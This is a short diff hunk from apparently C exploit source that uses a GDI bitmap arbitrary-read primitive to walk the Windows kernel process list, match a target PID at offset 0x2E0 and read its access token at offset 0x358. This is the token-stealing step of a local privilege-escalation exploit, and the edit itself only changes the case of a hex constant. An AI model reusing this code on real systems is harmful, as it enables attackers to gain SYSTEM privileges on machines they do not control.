@@ -425,7 +425,7 @@ mov [rax + 0x358], rcx
 	while (TRUE) {
 
 		DWORD64 NextProcessPID = BitmapArbitraryRead(
-			managerBitmap.hBmp, workerBitmap.hBmp, ((DWORD64)NextEpPtr + 0x2E0));
+			managerBitmap.hBmp, workerBitmap.hBmp, ((DWORD64)NextEpPtr + 0x2e0));
 		if (NextProcessPID == PID) { 
 			CurrentToken = BitmapArbitraryRead(
 				managerBitmap.hBmp, workerBitmap.hBmp, ((DWORD64)NextEpPtr + 0x358));
